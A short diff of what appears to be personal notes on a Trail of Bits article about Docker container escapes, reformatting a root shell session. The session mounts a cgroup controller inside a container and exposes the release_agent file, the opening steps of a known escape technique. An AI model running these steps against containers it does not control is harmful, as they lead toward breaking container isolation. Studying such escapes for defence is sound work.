@@ -3,12 +3,17 @@ WTF.
 
 https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/
 
-root@b11cf9eab4fd:/# mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
-root@b11cf9eab4fd:/# ls /tmp/cgrp/
-cgroup.clone_children  cgroup.procs  cgroup.sane_behavior  notify_on_release  release_agent  tasks  x
-root@b11cf9eab4fd:/# ls /tmp/cgrp/x
-cgroup.clone_children  cgroup.procs  notify_on_release  rdma.current  rdma.max  tasks
 
+mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
+
+root@b11cf9eab4fd:/# 
+
+ls /tmp/cgrp/
+cgroup.clone_children  cgroup.procs  cgroup.sane_behavior  notify_on_release  release_agent  tasks  x
+
+root@b11cf9eab4fd:/# ls /tmp/cgrp/x
+
+cgroup.clone_children  cgroup.procs  notify_on_release  rdma.current  rdma.max  tasks
 
 
 
